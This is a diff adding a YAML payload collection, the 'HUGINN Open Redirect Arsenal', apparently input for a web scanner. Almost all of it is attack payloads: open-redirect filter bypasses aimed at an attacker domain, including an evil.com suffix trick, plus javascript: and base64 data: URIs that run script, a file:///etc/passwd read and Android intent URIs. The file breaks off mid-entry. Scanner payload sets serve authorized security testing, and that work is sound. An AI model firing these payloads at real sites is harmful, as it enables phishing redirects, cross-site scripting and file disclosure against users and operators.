@@ -1,0 +1,2224 @@
+# =============================================================================
+#  HUGINN :: payloads/open_redirect.yaml
+#  Comprehensive Open Redirect Arsenal — 2026 Edition
+# -----------------------------------------------------------------------------
+#  Placeholders (substituted by scanner at load time):
+#    {{ATTACKER}}   → beardedviking.org           (static attacker domain)
+#    {{TARGET}}     → target under test            (e.g. vulnerable-site.com)
+#    {{SUBDOMAIN}}  → target's primary hostname    (e.g. app.vulnerable-site.com)
+#    {{CANARY}}     → redirect.beardedviking.org   (canary host)
+#    {{CANARY_URL}} → https://redirect.beardedviking.org/<token>/<id>
+#                     (tokenized canary URL — unique per payload)
+#    {{OOB}}        → https://oast.beardedviking.org/<token>/<id>
+#                     (tokenized OOB URL for chains)
+#
+#  Categories:
+#    - basic                : plain absolute URLs
+#    - protocol_relative    : scheme-relative //domain
+#    - backslash            : Windows/IE-style \/ bypass (2026 CVEs active)
+#    - whitelist_bypass     : make the URL look trusted
+#    - userinfo             : URL @ parsing quirks
+#    - encoding             : URL/double/hex/unicode/triple encoding
+#    - scheme_abuse         : javascript:, data:, vbscript:, blob:, file:
+#    - fragment             : # and ?-confusion tricks
+#    - crlf                 : header injection / response splitting
+#    - parameter_pollution  : duplicate params, array syntax, HPP
+#    - oauth_sso            : redirect_uri, RelayState, returnTo, next
+#    - header_based         : Referer / X-Forwarded-Host driven redirects
+#    - cookie_based         : cookie-set redirect chains
+#    - path_traversal       : ../../ and client-side path traversal chains
+#    - cloud_specific       : cloud metadata / SSRF chains
+#    - unicode              : NFKC / homoglyph / fullwidth bypasses
+#    - whitespace           : leading space/tab/CR/control chars
+#    - modern               : 2025/2026 parser-differential research
+#    - legacy               : 1990s–2000s syntax quirks
+#    - client_side          : DOM sinks (window.location, meta refresh, JS)
+# =============================================================================
+
+meta:
+  name: "HUGINN Open Redirect Arsenal"
+  version: "3.0.0"
+  description: >
+    Comprehensive open redirect payload set spanning 1990s legacy quirks
+    through 2025/2026 parser-differential bypasses, OAuth/SSO chain extension,
+    CRLF response splitting, Unicode NFKC normalisation, and cloud metadata
+    SSRF pivoting. Every payload carries metadata for context-aware routing
+    and tokenized canary correlation.
+  attacker_placeholder: "{{ATTACKER}}"
+  target_placeholder:   "{{TARGET}}"
+  subdomain_placeholder: "{{SUBDOMAIN}}"
+  canary_placeholder:   "{{CANARY}}"
+  oob_placeholder:      "{{OOB}}"
+  references:
+    - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+    - "https://portswigger.net/web-security/ssrf"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
+    - "https://hacktricks.wiki/en/pentesting-web/open-redirect.html"
+    - "https://github.com/cujanovic/Open-Redirect-Payloads"
+    - "https://www.vulnsy.com/cheat-sheets/open-redirect"
+    - "https://github.com/0xNanda/Oralyzer"
+    - "https://github.com/devanshbatham/OpenRedireX"
+  last_updated: "2026-09-11"
+
+payloads:
+
+  # ===========================================================================
+  #  1. BASIC
+  #     The obvious cases. If any of these work, the app has no redirect
+  #     allow-listing at all. Report as high-confidence immediately.
+  # ===========================================================================
+  - id: "basic-001"
+    name: "Absolute HTTPS to canary"
+    category: "basic"
+    payload: "https://{{CANARY}}/huginn/{{RANDOM}}"
+    description: "Plain absolute HTTPS redirect to canary host — baseline test."
+    tags: ["basic", "absolute"]
+    browsers: ["all"]
+    expected: "302/301/303/307/308 with Location: https://redirect.beardedviking.org/..."
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-002"
+    name: "Absolute HTTP to canary"
+    category: "basic"
+    payload: "http://{{CANARY}}/huginn/{{RANDOM}}"
+    description: "Plain absolute HTTP redirect."
+    tags: ["basic", "absolute"]
+    browsers: ["all"]
+    expected: "302/301/303/307/308 with Location: http://redirect.beardedviking.org/..."
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-003"
+    name: "Missing slash after scheme"
+    category: "basic"
+    payload: "https:{{CANARY}}"
+    description: "Missing // after scheme — some parsers normalise to https://."
+    tags: ["basic", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-004"
+    name: "Single slash after scheme"
+    category: "basic"
+    payload: "https:/{{CANARY}}"
+    description: "Single-slash — browser normalises to https://attacker."
+    tags: ["basic", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-005"
+    name: "Triple slash"
+    category: "basic"
+    payload: "https:///{{CANARY}}"
+    description: "Triple slash — RFC 3986 treats third / as path on strict parsers."
+    tags: ["basic", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-006"
+    name: "Uppercase scheme"
+    category: "basic"
+    payload: "HTTPS://{{CANARY}}/"
+    description: "Uppercase scheme bypasses case-sensitive scheme allow-lists."
+    tags: ["basic", "case"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-007"
+    name: "Absolute with explicit port"
+    category: "basic"
+    payload: "https://{{CANARY}}:443/"
+    description: "Explicit port — sometimes matches allow-list regexes that expect one."
+    tags: ["basic", "port"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-008"
+    name: "Absolute with basic-auth credentials"
+    category: "basic"
+    payload: "https://user:pass@{{CANARY}}/"
+    description: "Basic-auth style URL — naive validators only check host before @."
+    tags: ["basic", "userinfo"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-009"
+    name: "Mixed-case scheme"
+    category: "basic"
+    payload: "HtTpS://{{CANARY}}/"
+    description: "Mixed-case scheme — defeats case-sensitive prefix checks."
+    tags: ["basic", "case"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "basic-010"
+    name: "Four slashes"
+    category: "basic"
+    payload: "https:////{{CANARY}}"
+    description: "Four slashes — collapses to //canary on some parsers."
+    tags: ["basic", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  # ===========================================================================
+  #  2. PROTOCOL-RELATIVE
+  #     //attacker — inherits scheme. Single most common bypass.
+  #     Also active in 2025/2026 CVEs (Rodauth, Koa, Nitro).
+  # ===========================================================================
+  - id: "proto-001"
+    name: "Classic protocol-relative"
+    category: "protocol_relative"
+    payload: "//{{CANARY}}/"
+    description: "Classic // — inherits scheme from current page."
+    tags: ["protocol-relative", "classic"]
+    browsers: ["all"]
+    expected: "302 with Location: //redirect.beardedviking.org/"
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-82467"]
+    interaction: false
+
+  - id: "proto-002"
+    name: "Triple slash"
+    category: "protocol_relative"
+    payload: "///{{CANARY}}/"
+    description: "Triple slash — some parsers strip one and normalise to //."
+    tags: ["protocol-relative", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "proto-003"
+    name: "Protocol-relative with tab"
+    category: "protocol_relative"
+    payload: "/\t/{{CANARY}}/"
+    description: "Tab between slashes — parser differential (CVE-2026-75628)."
+    tags: ["protocol-relative", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://vuldb.com/cve/CVE-2026-75628"]
+    interaction: false
+
+  - id: "proto-004"
+    name: "Protocol-relative with newline"
+    category: "protocol_relative"
+    payload: "/\n/{{CANARY}}/"
+    description: "Newline between slashes — parser differential."
+    tags: ["protocol-relative", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "proto-005"
+    name: "Protocol-relative with CR"
+    category: "protocol_relative"
+    payload: "/\r/{{CANARY}}/"
+    description: "CR between slashes — CRLF-adjacent parser differential."
+    tags: ["protocol-relative", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "proto-006"
+    name: "Trailing double-slash with prefix"
+    category: "protocol_relative"
+    payload: "//{{CANARY}}/%2F.."
+    description: "Trailing double-slash — Koa/Express bypass (CVE-2025-62595)."
+    tags: ["protocol-relative", "trailing-slash", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-62595"]
+    interaction: false
+
+  - id: "proto-007"
+    name: "Many slashes"
+    category: "protocol_relative"
+    payload: "////////{{CANARY}}/"
+    description: "Eight slashes — collapses to protocol-relative on some parsers."
+    tags: ["protocol-relative", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "proto-008"
+    name: "Protocol-relative with auth"
+    category: "protocol_relative"
+    payload: "//user:pass@{{CANARY}}/"
+    description: "Protocol-relative with credentials."
+    tags: ["protocol-relative", "userinfo"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  # ===========================================================================
+  #  3. BACKSLASH TRICKS
+  #     Browsers normalise \ to / for special schemes. Multiple 2026 CVEs.
+  #     (Punk::OAuth2, CakePHP, Gitea, pac4j, React Router, Grav, Probo)
+  # ===========================================================================
+  - id: "backslash-001"
+    name: "Single backslash after slash"
+    category: "backslash"
+    payload: "/\\{{CANARY}}/"
+    description: "Browsers normalise to //canary — bypasses validators expecting /."
+    tags: ["backslash", "classic"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://vuldb.com/cve/CVE-2026-75628", "https://vuldb.com/cve/CVE-2026-82464"]
+    interaction: false
+
+  - id: "backslash-002"
+    name: "Backslash forward mix"
+    category: "backslash"
+    payload: "\\/{{CANARY}}/"
+    description: "Mixed \\/ — bypasses naive normalisers."
+    tags: ["backslash", "classic"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "backslash-003"
+    name: "Double backslash"
+    category: "backslash"
+    payload: "\\\\{{CANARY}}/"
+    description: "Double backslash — IE/Edge historically normalised to //."
+    tags: ["backslash", "legacy"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "backslash-004"
+    name: "Triple backslash"
+    category: "backslash"
+    payload: "\\\\\\{{CANARY}}/"
+    description: "Triple backslash — bypasses normalisers that only collapse double."
+    tags: ["backslash", "encoding"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "backslash-005"
+    name: "Absolute with backslash after scheme"
+    category: "backslash"
+    payload: "https:\\\\{{CANARY}}/"
+    description: "https:\\\\canary — Windows-style path normalisation."
+    tags: ["backslash", "windows"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "backslash-006"
+    name: "Mixed scheme separator"
+    category: "backslash"
+    payload: "https:/\\/{{CANARY}}/"
+    description: "Scheme followed by mixed slashes."
+    tags: ["backslash", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "backslash-007"
+    name: "Encoded backslash"
+    category: "backslash"
+    payload: "https://{{TARGET}}/%5C{{CANARY}}/"
+    description: "Percent-encoded backslash — decoded by backend, then normalised by browser."
+    tags: ["backslash", "encoding", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-25779"]
+    interaction: false
+
+  - id: "backslash-008"
+    name: "Double-encoded backslash"
+    category: "backslash"
+    payload: "https://{{TARGET}}/%255C{{CANARY}}/"
+    description: "Double-encoded backslash — bypasses single-decode validators."
+    tags: ["backslash", "encoding", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "backslash-009"
+    name: "Backslash before @ in authority"
+    category: "backslash"
+    payload: "https://{{TARGET}}\\@{{CANARY}}/"
+    description: "Backslash before @ — Windows-parser differential."
+    tags: ["backslash", "userinfo"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "backslash-010"
+    name: "Path traversal + double backslash"
+    category: "backslash"
+    payload: "/..//\\{{CANARY}}/"
+    description: "Traversal + backslash combo — Grafana CVE-2025-6023 bypass."
+    tags: ["backslash", "path_traversal", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://ethiack.com/news/grafana-cve-2025-6023-bypass"]
+    interaction: false
+
+  # ===========================================================================
+  #  4. WHITELIST BYPASS
+  #     Make the URL *appear* to start with the trusted domain.
+  # ===========================================================================
+  - id: "wl-001"
+    name: "Trusted-prefix dot-suffix"
+    category: "whitelist_bypass"
+    payload: "https://{{TARGET}}.{{CANARY}}/"
+    description: "Target as subdomain of canary — bypasses startswith() checks."
+    tags: ["whitelist_bypass", "subdomain"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://cve.threatint.com/CVE/CVE-2026-25477"]
+    interaction: false
+
+  - id: "wl-002"
+    name: "Attacker domain with target in query"
+    category: "whitelist_bypass"
+    payload: "https://{{CANARY}}?{{TARGET}}"
+    description: "Canary first, target in query — bypasses 'target anywhere' regex."
+    tags: ["whitelist_bypass", "query-confusion"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "wl-003"
+    name: "Target as userinfo"
+    category: "whitelist_bypass"
+    payload: "https://{{TARGET}}@{{CANARY}}/"
+    description: "Target as userinfo before @ — browser navigates to canary."
+    tags: ["whitelist_bypass", "userinfo", "classic"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "wl-004"
+    name: "Target as path"
+    category: "whitelist_bypass"
+    payload: "https://{{CANARY}}/{{TARGET}}"
+    description: "Target in path — bypasses naive 'target in url' checks."
+    tags: ["whitelist_bypass", "path-confusion"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "wl-005"
+    name: "Target in fragment"
+    category: "whitelist_bypass"
+    payload: "https://{{CANARY}}/#{{TARGET}}"
+    description: "Target in fragment — fragments not sent to servers."
+    tags: ["whitelist_bypass", "fragment"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "wl-006"
+    name: "Trailing dot bypass"
+    category: "whitelist_bypass"
+    payload: "https://{{TARGET}}.{{CANARY}}./"
+    description: "Trailing dot — some DNS resolvers still resolve, validators reject."
+    tags: ["whitelist_bypass", "trailing-dot"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "wl-007"
+    name: "Target port trick"
+    category: "whitelist_bypass"
+    payload: "https://{{TARGET}}:{{CANARY}}"
+    description: "Malformed port — parser may resolve to canary or error."
+    tags: ["whitelist_bypass", "port"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "wl-008"
+    name: "Chained redirect via target login"
+    category: "whitelist_bypass"
+    payload: "https://{{CANARY}}/login?next=https://{{TARGET}}/"
+    description: "Chained redirect — outer URL looks legit."
+    tags: ["whitelist_bypass", "chained"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "wl-009"
+    name: "Suffix-match bypass (CVE-2026-25477)"
+    category: "whitelist_bypass"
+    payload: "https://{{TARGET}}.evil.com/"
+    description: "Malicious domain ending with trusted string — regex not anchored."
+    tags: ["whitelist_bypass", "regex-bypass", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://cve.threatint.com/CVE/CVE-2026-25477"]
+    interaction: false
+
+  - id: "wl-010"
+    name: "Target with @ and fragment distraction"
+    category: "whitelist_bypass"
+    payload: "https://{{TARGET}}@{{CANARY}}/#@{{TARGET}}"
+    description: "Canary in authority, target appearing twice as distraction."
+    tags: ["whitelist_bypass", "userinfo"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "wl-011"
+    name: "Subdomain-of-target bypass"
+    category: "whitelist_bypass"
+    payload: "https://{{CANARY}}.{{TARGET}}/"
+    description: "Reverse subdomain confusion — canary as subdomain of target."
+    tags: ["whitelist_bypass", "subdomain"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "wl-012"
+    name: "Backslash whitelist bypass (CVE-2026-55590)"
+    category: "whitelist_bypass"
+    payload: "http://{{TARGET}}\\.{{CANARY}}"
+    description: "Backslash in authority — Flask-Security whitelist bypass."
+    tags: ["whitelist_bypass", "backslash", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://github.com/advisories/GHSA-w2j7-f3c6-g8cw"]
+    interaction: false
+
+  # ===========================================================================
+  #  5. USERINFO
+  #     The @ in URLs is a classic parser-differential zone.
+  # ===========================================================================
+  - id: "ui-001"
+    name: "Canary as userinfo, target as host"
+    category: "userinfo"
+    payload: "https://{{CANARY}}@{{TARGET}}/"
+    description: "Canary in userinfo — browser navigates to target."
+    tags: ["userinfo", "classic"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "ui-002"
+    name: "Target as userinfo, canary as host"
+    category: "userinfo"
+    payload: "https://{{TARGET}}@{{CANARY}}/"
+    description: "Validators checking 'starts with target' pass, browser goes to canary."
+    tags: ["userinfo", "classic"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ui-003"
+    name: "Userinfo with password"
+    category: "userinfo"
+    payload: "https://user:pass@{{CANARY}}/"
+    description: "Standard basic-auth form."
+    tags: ["userinfo"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ui-004"
+    name: "Encoded @"
+    category: "userinfo"
+    payload: "https://{{TARGET}}%40{{CANARY}}/"
+    description: "Percent-encoded @ — some parsers decode before validation."
+    tags: ["userinfo", "encoding"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ui-005"
+    name: "Double @"
+    category: "userinfo"
+    payload: "https://{{TARGET}}@@{{CANARY}}/"
+    description: "Double @ — legacy parser confusion."
+    tags: ["userinfo", "legacy"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "ui-006"
+    name: "Backslash before @"
+    category: "userinfo"
+    payload: "https://{{TARGET}}\\@{{CANARY}}/"
+    description: "Backslash before @ — Windows-parser differential (CVE-2026-75833)."
+    tags: ["userinfo", "backslash", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-75833"]
+    interaction: false
+
+  - id: "ui-007"
+    name: "Unicode fullwidth @"
+    category: "userinfo"
+    payload: "https://{{TARGET}}＠{{CANARY}}/"
+    description: "Fullwidth @ (U+FF20) — NFKC-normalising parsers accept it."
+    tags: ["userinfo", "unicode", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://cve.imfht.com/detail/CVE-2026-73420"]
+    interaction: false
+
+  - id: "ui-008"
+    name: "Target with bracket and @ (HackTricks 2026)"
+    category: "userinfo"
+    payload: "https://{{TARGET}}[@{{CANARY}}/"
+    description: "Bracket then @ — bypasses server-side URL parsers while browsers navigate to canary."
+    tags: ["userinfo", "parser-differential", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    references: ["https://hacktricks.wiki/en/pentesting-web/open-redirect.html"]
+    interaction: false
+
+  - id: "ui-009"
+    name: "Encoded bracket with @"
+    category: "userinfo"
+    payload: "https://{{TARGET}}%5B@{{CANARY}}/"
+    description: "Percent-encoded bracket then @ — server-side parser confusion."
+    tags: ["userinfo", "encoding", "2026"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  # ===========================================================================
+  #  6. ENCODING
+  #     URL, double-URL, triple-URL, hex, unicode, overlong UTF-8.
+  # ===========================================================================
+  - id: "enc-001"
+    name: "URL-encoded scheme"
+    category: "encoding"
+    payload: "https%3A%2F%2F{{CANARY}}%2F"
+    description: "Full URL-encoding of https://canary/."
+    tags: ["encoding", "url"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-002"
+    name: "URL-encoded slashes only"
+    category: "encoding"
+    payload: "https:%2F%2F{{CANARY}}%2F"
+    description: "Only slashes encoded — scheme stays visible."
+    tags: ["encoding", "url"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-003"
+    name: "Double URL-encoded scheme"
+    category: "encoding"
+    payload: "https%253A%252F%252F{{CANARY}}%252F"
+    description: "Double-encoded — bypasses WAFs that decode once."
+    tags: ["encoding", "double-url"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "enc-004"
+    name: "Triple URL-encoded scheme"
+    category: "encoding"
+    payload: "https%25253A%25252F%25252F{{CANARY}}%25252F"
+    description: "Triple-encoded — for parsers that decode multiple times."
+    tags: ["encoding", "triple-url"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "enc-005"
+    name: "Hex-encoded scheme"
+    category: "encoding"
+    payload: "0x68 0x74 0x74 0x70 0x73 0x3A 0x2F 0x2F{{CANARY}}"
+    description: "Hex representation — occasionally parsed by odd backends."
+    tags: ["encoding", "hex"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-006"
+    name: "Mixed-case percent encoding"
+    category: "encoding"
+    payload: "https:%2f%2F{{CANARY}}%2f"
+    description: "Mixed-case percent-encoding — bypasses case-sensitive normalisers."
+    tags: ["encoding", "case"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-007"
+    name: "Overlong UTF-8 slash"
+    category: "encoding"
+    payload: "https:%c0%af%c0%af{{CANARY}}"
+    description: "Overlong UTF-8 encoding of / — legacy IIS quirk."
+    tags: ["encoding", "overlong-utf8", "legacy"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-008"
+    name: "Percent-encoded hostname dots"
+    category: "encoding"
+    payload: "https://{{CANARY}}%2Ecom/"
+    description: "Encoded dots — parsers may or may not decode before host resolution."
+    tags: ["encoding", "url"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-009"
+    name: "Double-encoded target slash"
+    category: "encoding"
+    payload: "https://{{TARGET}}%252F%252F{{CANARY}}/"
+    description: "Double-encoded slashes — target parser decodes once, browser decodes twice."
+    tags: ["encoding", "double-url", "2025"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "enc-010"
+    name: "Tab in path"
+    category: "encoding"
+    payload: "https://{{TARGET}}/%09/{{CANARY}}"
+    description: "Tab character in path — some parsers strip, some don't."
+    tags: ["encoding", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-011"
+    name: "URL-encoded null byte"
+    category: "encoding"
+    payload: "https://{{TARGET}}%00.{{CANARY}}/"
+    description: "URL-encoded null — truncates validation in C-based parsers."
+    tags: ["encoding", "null-byte", "legacy"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "enc-012"
+    name: "Base64-encoded URL in data URI"
+    category: "encoding"
+    payload: "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9yZWRpcmVjdC5iZWFyZGVkdmlraW5nLm9yZy8nPC9zY3JpcHQ+"
+    description: "Base64-encoded data URI that navigates to canary via JS."
+    tags: ["encoding", "data-uri", "xss-chain"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  # ===========================================================================
+  #  7. SCHEME ABUSE
+  #     Redirect to non-http(s) schemes. Often more impactful (XSS, RCE).
+  # ===========================================================================
+  - id: "scheme-001"
+    name: "javascript: alert"
+    category: "scheme_abuse"
+    payload: "javascript:alert(document.domain)"
+    description: "Direct JS execution if reflected into href/Location context."
+    tags: ["scheme_abuse", "xss"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-4123"]
+    interaction: false
+
+  - id: "scheme-002"
+    name: "javascript: with tab in scheme"
+    category: "scheme_abuse"
+    payload: "java\tscript:alert(document.domain)"
+    description: "Tab in scheme — bypasses 'javascript:' signature."
+    tags: ["scheme_abuse", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "scheme-003"
+    name: "javascript: with newline in scheme"
+    category: "scheme_abuse"
+    payload: "java\nscript:alert(document.domain)"
+    description: "Newline in scheme."
+    tags: ["scheme_abuse", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "scheme-004"
+    name: "javascript: with CRLF in scheme"
+    category: "scheme_abuse"
+    payload: "java%0d%0ascript%0d%0a:alert(1)"
+    description: "CRLF inside scheme defeats keyword filters (Vulnsy 2026)."
+    tags: ["scheme_abuse", "crlf", "2026"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    references: ["https://www.vulnsy.com/cheat-sheets/open-redirect"]
+    interaction: false
+
+  - id: "scheme-005"
+    name: "data: HTML script"
+    category: "scheme_abuse"
+    payload: "data:text/html,<script>alert(document.domain)</script>"
+    description: "data: URI — full HTML rendering if browser allows top-level."
+    tags: ["scheme_abuse", "data-uri"]
+    browsers: ["chrome", "firefox"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "scheme-006"
+    name: "data: base64"
+    category: "scheme_abuse"
+    payload: "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"
+    description: "Base64-encoded data: URI."
+    tags: ["scheme_abuse", "data-uri"]
+    browsers: ["chrome", "firefox"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "scheme-007"
+    name: "vbscript: URI"
+    category: "scheme_abuse"
+    payload: "vbscript:msgbox(1)"
+    description: "Legacy IE-only, still triggered in embedded WebViews."
+    tags: ["scheme_abuse", "legacy", "windows"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "scheme-008"
+    name: "blob: URI"
+    category: "scheme_abuse"
+    payload: "blob:https://{{CANARY}}/abc-123"
+    description: "Blob URL — rarely exploitable but confuses validators."
+    tags: ["scheme_abuse", "blob"]
+    browsers: ["chrome"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "scheme-009"
+    name: "file: URI"
+    category: "scheme_abuse"
+    payload: "file:///etc/passwd"
+    description: "Local file read via redirect to file://."
+    tags: ["scheme_abuse", "file"]
+    browsers: ["all"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "scheme-010"
+    name: "ftp: URI"
+    category: "scheme_abuse"
+    payload: "ftp://{{CANARY}}/"
+    description: "FTP redirect — legacy browser support."
+    tags: ["scheme_abuse", "ftp", "legacy"]
+    browsers: ["legacy"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "scheme-011"
+    name: "tel: URI"
+    category: "scheme_abuse"
+    payload: "tel:+15551234567"
+    description: "Phone dialer redirect on mobile."
+    tags: ["scheme_abuse", "mobile"]
+    browsers: ["all"]
+    severity_hint: "low"
+    interaction: false
+
+  - id: "scheme-012"
+    name: "intent: URI (Android)"
+    category: "scheme_abuse"
+    payload: "intent://scan/#Intent;scheme=zxing;end"
+    description: "Android intent URI — launches arbitrary activities."
+    tags: ["scheme_abuse", "android", "mobile"]
+    browsers: ["android"]
+    severity_hint: "high"
+    interaction: false
+
+  - id: "scheme-013"
+    name: "Chrome internal URI"
+    category: "scheme_abuse"
+    payload: "chrome://settings/"
+    description: "Browser-internal navigation from a redirect."
+    tags: ["scheme_abuse", "browser-internal"]
+    browsers: ["chrome"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "scheme-014"
+    name: "about: URI"
+    category: "scheme_abuse"
+    payload: "about:blank"
+    description: "about:blank navigation — breaks validators."
+    tags: ["scheme_abuse", "browser-internal"]
+    browsers: ["all"]
+    severity_hint: "low"
+    interaction: false
+
+  - id: "scheme-015"
+    name: "Mixed-case javascript"
+    category: "scheme_abuse"
+    payload: "JaVaScRiPt:alert(document.domain)"
+    description: "Mixed-case javascript: scheme — defeats case-sensitive filters."
+    tags: ["scheme_abuse", "case"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "scheme-016"
+    name: "javascript: with leading whitespace"
+    category: "scheme_abuse"
+    payload: "  javascript:alert(1)"
+    description: "Leading whitespace before scheme — some parsers trim, some don't."
+    tags: ["scheme_abuse", "whitespace"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  - id: "scheme-017"
+    name: "JavaScript URI with HTML entity"
+    category: "scheme_abuse"
+    payload: "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)"
+    description: "HTML-entity encoded javascript: scheme."
+    tags: ["scheme_abuse", "encoding"]
+    browsers: ["all"]
+    severity_hint: "critical"
+    interaction: false
+
+  # ===========================================================================
+  #  8. FRAGMENT / QUERY CONFUSION
+  #     Exploit how servers vs clients parse # and ?.
+  # ===========================================================================
+  - id: "frag-001"
+    name: "Fragment hides canary"
+    category: "fragment"
+    payload: "https://{{TARGET}}/#https://{{CANARY}}/"
+    description: "Target in path, canary in fragment — server sees target, client may redirect."
+    tags: ["fragment"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "frag-002"
+    name: "Query-then-fragment chain"
+    category: "fragment"
+    payload: "https://{{TARGET}}/?next=https://{{CANARY}}/#"
+    description: "Canary in nested query."
+    tags: ["fragment", "chained"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "frag-003"
+    name: "Double question mark"
+    category: "fragment"
+    payload: "https://{{TARGET}}??https://{{CANARY}}/"
+    description: "Double ? — parser treats second as path or query fragment."
+    tags: ["fragment", "parser-quirk"]
+    browsers: ["all"]
+    severity_hint: "medium"
+    interaction: false
+
+  - id: "frag-004"
+    name: "Question mark in path"
+    category: "fragment"
+    payload: "https://{{CANARY}}?x={{TARGET}}"
+    description: "Canary as host, target in query string."
+    tags: ["fragment", "query-confusion"]
+    browsers: ["all"]
